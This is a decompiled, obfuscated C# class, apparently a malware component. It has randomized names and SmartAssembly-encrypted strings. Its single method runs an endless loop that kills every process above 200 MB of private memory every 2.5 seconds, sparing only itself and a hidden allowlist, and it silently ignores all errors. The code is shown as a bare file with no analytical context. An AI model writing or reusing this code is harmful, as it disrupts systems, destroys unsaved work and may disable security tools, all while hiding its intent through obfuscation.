using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public static class IUmAujruwdxT
{
	[NonSerialized]
	internal static GetString _001F;

	public static void NcgkgbiyeApEB()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200 && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(_001F(107399014)) && !process.ProcessName.Contains(_001F(107399037)) && !process.ProcessName.Contains(_001F(107399028)) && !process.ProcessName.Contains(_001F(107398987)) && !process.ProcessName.Contains(_001F(107399006)) && !process.ProcessName.Contains(_001F(107398993)) && !process.ProcessName.Contains(_001F(107398948)) && !process.ProcessName.Contains(_001F(107398967)) && !process.ProcessName.Contains(_001F(107398922)) && !process.ProcessName.Contains(_001F(107398941)) && !process.ProcessName.Contains(_001F(107398888)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static IUmAujruwdxT()
	{
		Strings.CreateGetStringDelegate(typeof(IUmAujruwdxT));
	}
}
